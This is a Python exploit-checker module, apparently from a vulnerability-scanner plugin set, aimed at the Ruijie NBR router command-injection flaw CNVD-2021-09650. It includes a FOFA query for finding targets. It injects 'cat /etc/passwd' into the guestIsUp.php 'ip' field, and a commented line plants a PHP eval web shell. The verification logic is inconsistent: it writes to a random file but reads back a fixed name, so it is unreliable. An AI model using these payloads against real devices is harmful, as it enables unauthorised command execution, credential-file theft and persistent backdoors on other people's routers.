#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :   "https://peiqi.wgpsec.org/wiki/iot/锐捷/锐捷 NBR 路由器 guestIsUp.php 远程命令执行漏洞 CNVD-2021-09650.html",

      'huixian'   :   '',

      'method'    :   'post',

      'bugname'   :   '锐捷NBR路由器远程命令执行(CNVD-2021-09650)漏洞',

      'level'     :   'high',

      'fofa'      :   'title="锐捷网络-EWEB网管系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(10)
  ret = msg()
  headers = {
        'User-Agent': ua,
        "Content-Type": "application/x-www-form-urlencoded",
      }
  # data = "mac=1&ip=127.0.0.1%7Ccat+%2Fetc%2Fpasswd+%3E+test_test.txt&mac=1"#exp替换处

  #data = "mac=1&ip=192.168.1.1|echo '<?php @eval($_POST['bb']) ?>' > shell.php"
  data = f"mac=1&ip=127.0.0.1%7Ccat+%2Fetc%2Fpasswd+%3E+{r0}.txt&mac=1"
  target = '/guest_auth/guestIsUp.php'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200:
      url2 = url + "/guest_auth/test_test.txt"
      res = requests.get(url=url2, headers=headers,verify=False, timeout=5)
      if 'root:' in res.text and res.status_code == 200:
        ret['huixian'] = f'漏洞验证地址：{url}/guest_auth/{r0}.txt'
        res.close()
        ret['ifbug'] = True
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret